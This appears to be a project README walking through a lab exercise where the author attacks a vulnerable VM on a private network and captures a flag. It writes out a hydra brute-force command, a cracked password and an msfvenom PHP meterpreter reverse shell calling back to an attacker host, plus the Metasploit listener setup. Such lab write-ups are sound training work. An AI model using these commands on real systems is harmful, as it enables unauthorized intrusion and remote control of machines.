# Red-Team-VS-Blue-Team-Project
Acted as a red team to attack a vulnerable VM within my environment, ultimately gaining root access to the machine. Acted as Blue Team to use Kibana to review logs taken during the attack implemented as the red team.

   Red Team
- Ifconfig to find out network IP address and network range ![ifconfig](https://user-images.githubusercontent.com/61332852/137389108-3288b38b-5fcd-497a-878f-206fe37f54f1.png)

- Netdiscover -r 192.168.1.255/16 Since we know the netmask is 255.255.255.0 that would be 16 bits of the subnet so then we can run the netdiscover command to discover other hosts on the network. ![netdiscover](https://user-images.githubusercontent.com/61332852/137389276-f4aca53a-40ea-41ac-a4b7-9ab04459d79a.png)
      - After running the command we can conclude that there are 3 hosts within the network with the IPs of 192.168.1.1 , 192.168.1.100 and 192.168.1.105.
      - Now we need to discover what machine we need to get access to 
- After checking up on the IPs we can conclude that 192.168.1.105 ended up being a web server.   
- After checking the website we see open directories that show company information showing that this is a vulnerability in itself. ![index](https://user-images.githubusercontent.com/61332852/137389410-4a1dec9f-30c7-4052-9a34-50fb89184500.png)
And while exploring through the files we see an important directory being mentioned by the name of a secret_folder. Which can end up containing PII or important company documents. 
After going in the URL bar and typing in the secret folder found 192.168.1.105/company_folders/secret_folder it then shows a login prompt meant for “Ashton” only. 
After getting a username for a potential login we can then try to brute force the login by using hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder command. 
After using the command we successfully brute force the account and was able to retrieve the login information for ashton 


Logging in the account then brings us to a personal note Ashton then made for himself containing other important information 
A note that hes going to be using Ryans account 
after researching more on the web server we found that Ryan is the CEO of the company.
Hinting knowing that Ashton knows his login information with the hash giving at the top of the screen
Next step is to figure out the login to the file directory dav://192.168.1.105/webdav/ using the hashed password at the top of Ashtons note. Using the website https://crackstation.net/  
Cracking the hash we find the password is linux4u
Getting the login information to the company directory we know can exploit getting into the company system since the server has an open port 80 by creating a reverse shell script. The command being msf venom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 -f raw > newshell.php
Once the reverse shell script is created we can now upload it to the shared directory to run it. 
Before we run it we will want to run Metasploit to listen to the reverse shell on our host machine to access it remotely.
The commands would be used in this order to begin the listening 
Msfconsole -q
Use exploit/multi/handler
Set payload php/meterpreter/reverse_tcp
(same payload script as the one we copied to the shared directory)
Set LHOST 192.168.1.90
Ip of machine we want to listen on 
Set LPORT 4444
Port we want to listen on
Show options 
To see if all the settings we had set are correct
Run
To execute the listening process


Once this is completed we can now run the actual script through the shared directory dav://192.168.1.105/webdav which then after will then open up meterpreter on our host machine to show that we have now established connection 
After having the session open we can run basic commands to grab any other additional information about the system we got access to like getuid. We can also open up a shell terminal if needed by using the command shell.
We can now run the command find -iname flag.txt to grab the flag we are looking for one the target machine.

